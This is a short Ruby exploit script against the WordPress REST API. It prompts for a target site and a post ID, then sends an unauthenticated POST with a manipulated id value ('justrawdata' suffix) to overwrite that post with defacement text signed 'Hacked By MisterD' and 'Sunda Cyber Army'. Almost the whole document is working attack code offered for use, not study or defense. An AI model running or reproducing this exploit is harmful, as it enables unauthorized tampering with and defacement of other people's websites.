﻿# usage : gem install rest-client

require 'rest-client' 
require 'json' 
puts "Enter Target URI (With wp directory)" 
targeturi = gets.chomp 
puts "Enter Post ID" 
postid = gets.chomp.to_i 
response = RestClient.post( 
   "#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}", 
   { 

    "id" => "#{postid}justrawdata", 
	"title" => "Hacked By MisterD", 
	"content" => "<center><h1><i> Sunda Cyber Army !</h1></i><pre> We Are Black Hat .</pre></center>" 
	
	
	}.to_json, 
	:content_type => :json, 
	:accept => :json 
  ) {|response, request, result| response } 
  if(response.code == 200) 
  
  puts "Done! '#{targeturi}/index.php?p=#{postid}'" 
  
  
  else 
  puts "This site is not Vulnerable" 
  end
